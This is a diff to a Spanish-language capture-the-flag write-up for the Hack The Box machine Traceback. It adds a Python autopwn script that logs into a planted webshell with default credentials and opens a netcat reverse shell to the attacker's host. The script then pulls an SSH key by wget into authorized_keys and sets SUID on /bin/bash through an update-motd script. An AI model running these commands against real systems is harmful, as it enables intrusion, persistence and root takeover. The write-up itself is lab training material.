@@ -207,12 +207,113 @@ $ bash -p
 
 ## Autopwn.
 
-Esto no acaba aquí, vamos a construirnos un autopwn utilizando python.
-
+Esto no acaba aquí, vamos a construirnos un autopwn utilizando python. Asignamos la cabecera, importamos los paquetes a utilizar y asignamos un puerto con el que vamos a estar trabajando.
 
 ```python
 #!/usr/bin/env python3
+#Author: Intrusionz3r0 
+import requests,time,threading,sys,signal
+from pwn import *
 
+#Variables Globales 
+LPORT=1234
+```
+
+
+Utilizamos la librería `signal` para manejar la salida del programa.
+```python
+def handler(key,frame):
+	print("Adios!!")
+	sys.exit(0)
+
+signal = signal.signal(signal.SIGINT,handler)
+```
+
+Creamos el siguiente método para poder obtener una shell utilizando la webshell de `smevk.php`.
+```python
+def getShell(LHOST):
+
+	url = "http://traceback.htb/smevk.php" #Asignamos la url.
+	s = requests.session() #Guardamos la sesion.
+
+	p1 = log.progress("Login") 
+	data1={ # definimos la data.
+		"uname":"admin",
+		"pass":"admin",
+		"login":"Login"
+	}
+	p1.status("Ingresando credenciales.")
+	time.sleep(4)
+	r1 = s.post(url,data=data1) #Enviamos la data para poder loguearnos en el la webshell.
+	p1.success("Logueado correctamente.")
+
+	p2 = log.progress("Shell")
+	data2={ #Asignamos la data dos para poder enviarnos la revere shell.
+		"a":"Console",
+		"c":"/var/www/html",
+		"p1":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(LHOST,LPORT),
+		"p2":"",
+		"p3":"",
+		"charset":"UTF-8"
+	}
+	p2.status("Enviando reverse shell, por favor espere.")
+	time.sleep(2)
+	try:
+		r2 = s.post(url,data=data2,timeout=10) #Enviamos la data para obtener una reverse shell.
+	except requests.exceptions.Timeout:
+		p2.success("Estamos dentro del sistema.")
+```
+
+Creamos nuestro método main para manejar el flujo de ejecución.
+```python
+if __name__ == "__main__":
+
+	if(len(sys.argv) != 2): #Verifico que los argumentos que se le pasen al script sean solo 2 (nombre del script,LHOST)
+		log.info("Uso: python {} <LHOST> ; ssh sysadmin@traceback.htb 'bash -p'".format(sys.argv[0]))
+		sys.exit(0)
+
+	LHOST = sys.argv[1]
+
+	shell = listen(LPORT,timeout=20)
+	try:
+		threading.Thread(target=getShell(LHOST)).start() #Ejecuto en hilo el método getShell()
+		threading.Thread(target=upServer).start() #De igual manera aquí.
+	except Exception as e:
+		log.error(str(e))
+
+	if not (shell.sock is None): # Si recibimos una conexión entonces invocamos al método escalarRoot()
+		escalarRoot(LHOST)
+```
+
+Defino aquí toda la lógica que vimos anteriormente para poder escalar a root.
+```python
+def escalarRoot(LHOST):
+	p3 = log.progress("Root")
+	p3.status("Escalando de webmin a sysadmin.")
+	shell.sendline(""" sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/bash')" """) # Me convierto en el usuario sysadmin.
+	shell.sendline("cd ~/.ssh") #Voy al directorio .ssh del usuario sysadmin.
+	time.sleep(2)
+	p3.status("Sobreescribiendo clave ssh.")
+	shell.sendline("wget http://{}:8000/id_rsa.pub -O authorized_keys".format(LHOST)) #Descargo mi clave publica ssh de mi servidor.
+	time.sleep(2)
+	os.system("ps -aux | grep  'SimpleHTTPServer' | head -n 1 | awk '{print $2}' | xargs kill") #Mato el proceso del servidor.
+	p3.status("Asignando SUID a /bin/bash.")
+	time.sleep(3)
+	shell.sendline(""" cd /etc/update-motd.d && echo "chmod u+s /bin/bash" >> 00-header """) #Asigno el SUID al binario /bin/bash.
+	p3.success("Somos root!!")
+	sys.exit(0) #Termino la ejecución del programa.
+```
+
+Creo un método para levantar un servidor en mi carpeta .ssh y poder compartir esos archivos.
+```python
+def upServer():
+	os.system("cd ~/.ssh && python -m SimpleHTTPServer 8000 &")
+```
+Código completo:
+
+```python
+#!/usr/bin/env python3
+#Author: Intrusionz3r0
 
 import requests,time,threading,sys,signal
 from pwn import *
@@ -270,7 +371,7 @@ def escalarRoot(LHOST):
 	shell.sendline("wget http://{}:8000/id_rsa.pub -O authorized_keys".format(LHOST))
 	time.sleep(2)
 	os.system("ps -aux | grep  'SimpleHTTPServer' | head -n 1 | awk '{print $2}' | xargs kill")
-	p3.status("Asignando SUID a /bin/bash")
+	p3.status("Asignando SUID a /bin/bash.")
 	time.sleep(3)
 	shell.sendline(""" cd /etc/update-motd.d && echo "chmod u+s /bin/bash" >> 00-header """)
 	p3.success("Somos root!!")
@@ -297,3 +398,10 @@ if __name__ == "__main__":
 	if not (shell.sock is None):
 		escalarRoot(LHOST)
 ```
+
+## GIF del autopwn.
+
+![GIF AUTOPWN]({{ "/assets/img/Post/GIFS/traceback.gif" }})
+
+
+
